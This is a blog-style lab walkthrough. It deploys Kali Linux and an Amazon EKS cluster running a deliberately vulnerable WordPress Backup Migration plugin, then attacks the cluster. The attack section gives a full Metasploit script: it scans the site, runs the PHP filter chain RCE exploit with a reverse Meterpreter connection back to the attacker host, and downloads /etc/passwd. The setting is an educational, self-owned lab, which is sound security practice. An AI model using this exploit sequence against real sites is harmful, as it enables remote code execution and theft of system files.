---
title: Exploit vulnerability in a WordPress plugin with Kali Linux
author: Petr Ruzicka
date: 2024-04-27
description: Learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux
categories: [Kubernetes, Amazon EKS, Security, Exploit, Vulnerability, Kali Linux]
tags:
  [
    Amazon EKS,
    k8s,
    kubernetes,
    security,
    eksctl,
    Kali Linux,
    exploit,
    vulnerability,
    WordPress,
    plugin,
  ]
image: https://raw.githubusercontent.com/ziadOUA/m3-Markdown-Badges/b186f2f632218b42ca465481e78f1dcd67d0947e/badges/KaliLinux/kalilinux2.svg
---

![Kali Linux](https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png)

![Kali Linux](https://raw.githubusercontent.com/I-Am-Jakoby/I-Am-Jakoby/7b157110a552c8e37a87394b77dc9cd9be45e48d/img/kali-linux.svg)

![Kali Linux](https://github.com/Qroia/Qroia/blob/af0f0d001bebaebbd340a9e688aaa54a98fa2eb5/configs/gnu-linux/themes/TokyoNight/tokyonight__dark_icons/apps/64/kali-metasploit.svg)

![Kali Linux](https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png)

For the educational purposes, I have created this repository to keep my notes on
Kubernetes hacking.

The goal is to learn how to hack application running on Kubernetes clusters and
detect such attacks using security tools.

## Set necessary environment variables and download CloudFormation templates

```bash
export AWS_REGION="eu-central-1"
export AWS_EC2_KEY_PAIR_NAME="ruzickap"
```

Download the CloudFormation templates for Ubuntu, Kali Linux and VPC:

```bash
wget https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/e43fe99f21b02635873bddeed92b669e8e5156d3/ci_tools/vpc_cloudformation_template.yml
wget https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/main/cfn/KaliLinux-NICE-DCV.yaml
wget https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/main/cfn/Ubuntu-NICE-DCV.yaml
```

## Install Kali Linux

Install [Kali Linux](https://www.kali.org/) on Amazon EC2 instance using the
CloudFormation template:

```bash
export SOLUTION_KALI="KaliLinux-NICE-DCV"

aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \
  --parameter-overrides "EnvironmentName=${SOLUTION_KALI}" \
  --stack-name "${SOLUTION_KALI}-VPC" --template-file vpc_cloudformation_template.yml \
  --tags "Owner=$USERNAME Environment=dev Solution=${SOLUTION_KALI}"

AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_KALI}-VPC")
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".Stacks[0].Outputs[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".Stacks[0].Outputs[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_NAMED_IAM CAPABILITY_IAM \
  --parameters "ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID}" \
  --stack-name "${SOLUTION_KALI}" --template-body file://KaliLinux-NICE-DCV.yaml \
  --tags "Key=Owner,Value=$USERNAME Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}"

# Use aws-cli to allow HTTPS traffic to the EC2 instance
# https://github.com/aws-samples/amazon-ec2-nice-dcv-samples/issues/4
AWS_EC2_KALI_LINUX_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --output text \
  --filters "Name=tag:Solution,Values=${SOLUTION_KALI}" \
  --query 'SecurityGroups[?IpPermissions[?ToPort==`8443` && contains(IpRanges[].CidrIp, `0.0.0.0/0`)]].GroupId' \
)
aws ec2 authorize-security-group-ingress --group-id "${AWS_EC2_KALI_LINUX_SECURITY_GROUP_ID}" \
  --protocol tcp --port 443 --cidr 0.0.0.0/0
```

## Install Amazon EKS cluster and vulnerable Wordpress Application

### Install the Amazone EKS cluster

Install the Amazon EKS cluster using the `eksctl`:

```bash
SOLUTION_EKS="Amazon-EKS"
export KUBECONFIG="/tmp/kubeconfig-${SOLUTION_EKS}.conf"

eksctl create cluster \
  --name "${SOLUTION_EKS}" --tags "Owner=${USERNAME},Solution=${SOLUTION_EKS},Cluster=${SOLUTION_EKS}" \
  --node-type t4g.medium --node-volume-size 20 --node-private-networking \
  --kubeconfig "${KUBECONFIG}"
```

### Install vulnerable Wordpress Application

Install vulnerable Wordpress Application to the Amazon EKS cluster:

```bash
# https://github.com/bitnami/charts/tree/main/bitnami/wordpress
WORDPRESS_HELM_CHART_VERSION="22.1.3"

tee "/tmp/helm_values-wordpress.yml" << EOF
wordpressUsername: wordpress
wordpressPassword: $(openssl rand -base64 12)
customPostInitScripts:
  install_plugins.sh: |
    wp plugin install backup-backup --version=1.3.7 --activate
persistence:
  enabled: false
mariadb:
  primary:
    persistence:
      enabled: false
EOF
helm upgrade --install --version "${WORDPRESS_HELM_CHART_VERSION}" --namespace wordpress --create-namespace --values "/tmp/helm_values-wordpress.yml" wordpress oci://registry-1.docker.io/bitnamicharts/wordpress
```

The vulnerable version of the [WordPress Backup Migration Plugin](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
plugin was installed.

Details about the vulnerability can be found in the
[WordPress Backup Migration Plugin PHP Filter Chain RCE](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
post.

Let's get the LoadBalancer / Wordpress URL and login credentials:

```bash
export K8S_WORDPRESS_SERVICE=$(kubectl get svc --namespace wordpress wordpress --template "{{ range (index .status.loadBalancer.ingress 0) }}{{ . }}{{ end }}")
echo "WordPress URL: http://${K8S_WORDPRESS_SERVICE}/"
echo "WordPress Admin URL: http://${K8S_WORDPRESS_SERVICE}/admin"
echo Username: wordpress
echo Password: $(kubectl get secret --namespace wordpress wordpress -o jsonpath="{.data.wordpress-password}" | base64 -d)
```

```text
WordPress URL: http://a8584a20dced449d3a1c5c38e0f5e222-1249223458.eu-central-1.elb.amazonaws.com/
WordPress Admin URL: http://a8584a20dced449d3a1c5c38e0f5e222-1249223458.eu-central-1.elb.amazonaws.com/admin
Username: wordpress
Password: M........3
```

## Attack the Wordpress Application

Login to the Kali Linux instance and attack the Wordpress Application:

```bash
AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
ssh "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" << EOF2
sudo snap install metasploit-framework
msfdb init

cat << EOF | msfconsole --resource -
use auxiliary/scanner/http/wordpress_scanner
set rhost ${K8S_WORDPRESS_SERVICE}
run

use exploit/multi/http/wp_backup_migration_php_filter
set rhost ${K8S_WORDPRESS_SERVICE}
set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP}
set lport 443
run

sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo --meterpreter-command "download /etc/passwd"
exit -y
EOF
EOF2
```

## Cleanup

```bash
aws cloudformation delete-stack --stack-name "${SOLUTION}"
eksctl delete cluster --name "${SOLUTION}-EKS"
aws cloudformation delete-stack --stack-name "${SOLUTION}-VPC"
```

Enjoy ... ðŸ˜‰
